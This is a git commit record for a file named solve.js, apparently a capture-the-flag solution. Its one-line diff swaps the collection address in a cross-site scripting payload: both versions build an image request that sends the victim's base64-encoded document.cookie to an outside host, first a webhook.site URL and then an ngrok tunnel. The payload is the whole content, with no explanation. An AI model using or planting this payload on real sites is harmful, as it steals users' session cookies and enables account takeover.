3df236615741d89134dca4e8ab468fd46ba974b9
LanceloT <94410620+LaceloTT@users.noreply.github.com>
2024-11-22 20:27:21 -0300

    Update solve.js

--- solve.js
+++ solve.js
@@ -1,1 +1,1 @@
-x = new Image(); x.src = 'https://webhook.site/d8a3f99c-2098-43dd-815d-4261b61a39b5?data='+btoa(document.cookie);
+x = new Image(); x.src = 'https://15ed-190-114-33-103.ngrok-free.app?data='+btoa(document.cookie);
